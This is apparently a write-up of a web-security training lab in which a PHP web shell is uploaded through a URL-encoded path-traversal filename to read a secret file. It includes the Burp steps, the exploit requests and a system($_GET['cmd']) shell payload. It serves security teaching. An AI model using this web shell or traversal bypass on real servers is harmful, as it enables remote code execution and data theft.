# Lab: Web Shell Upload via Path Traversal

**Category:** PRACTITIONER  
**Status:** Not solved  

This lab contains a vulnerable image upload function. Although the server is configured to prevent execution of user-supplied files, this restriction can be bypassed by exploiting a secondary vulnerability.

Your objective is to upload a PHP web shell, use it to exfiltrate the contents of `/home/carlos/secret`, and submit the retrieved secret to solve the lab.

---

### **Lab Details**
- You can log in to your account using the following credentials:  
  **Username:** `wiener`  
  **Password:** `peter`
- Access the lab via the provided link.

---

### **Solution Steps**

#### **1. Initial Image Upload and Inspection**
1. Log in to your account using the provided credentials.
2. Navigate to your profile and upload an image as your avatar.
3. Return to your account page and observe the uploaded avatar.
4. Use **Burp Suite**:
   - Go to `Proxy > HTTP history`.
   - Find the GET request to `/files/avatars/<YOUR-IMAGE>` and send it to **Burp Repeater** for further analysis.

#### **2. Creating the Exploit**
1. On your local system, create a PHP file named `exploit.php` containing the following code:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
2. Upload `exploit.php` as your avatar. Note that the server does not explicitly prevent PHP file uploads.
3. In Burp Repeater, modify the GET request to replace the image file name with `exploit.php` and send the request. Observe that the server does not execute the PHP code but instead returns it as plain text.

#### **3. Bypassing Upload Restrictions with Path Traversal**
1. In **Burp Proxy**, locate the POST request for `/my-account/avatar` that was used to upload the file.
2. Send the POST request to **Burp Repeater**.
3. Modify the `Content-Disposition` header in the request body to include a directory traversal sequence:
   ```
   Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
   ```
4. Send the modified request. Note that the server strips the directory traversal sequence but allows the upload.
5. Obfuscate the directory traversal by URL encoding the forward slash (`/`) character:
   ```
   filename="..%2fexploit2.php"
   ```
6. Send the request. The response should indicate the file was successfully uploaded:
   ```
   The file avatars/../exploit2.php has been uploaded.
   ```

#### **4. Executing the Exploit**
1. In your browser, return to your account page.
2. Use Burp Proxy to locate the GET request for the uploaded file:
   ```
   GET /files/avatars/..%2fexploit2.php
   ```
3. Observe that the file execution reveals the contents of `/home/carlos/secret`. Alternatively, request the file directly using:
   ```
   GET /files/exploit2.php
   ```

#### **5. Submitting the Secret**
1. Copy the retrieved secret.
2. Submit it in the lab banner to complete the challenge.

---

### **Proof of Concept (PoC)**

#### **Modified POST Request**
```http
POST /my-account/avatar HTTP/1.1
Host: <LAB_HOST>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fexploit2.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

#### **Execution Request**
```http
GET /files/exploit2.php?cmd=cat+/home/carlos/secret HTTP/2
```

---

### **Conclusion**
By leveraging path traversal and the server's URL decoding behavior, it was possible to upload the malicious `exploit2.php` file outside the restricted directory and execute it to retrieve sensitive information. This demonstrates a critical flaw in file upload validation and directory traversal sanitization, highlighting the need for robust server-side validation and sanitization mechanisms.

![File Upload Remote Code Execution via Web Shell Upload Lab3](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab3a.PNG)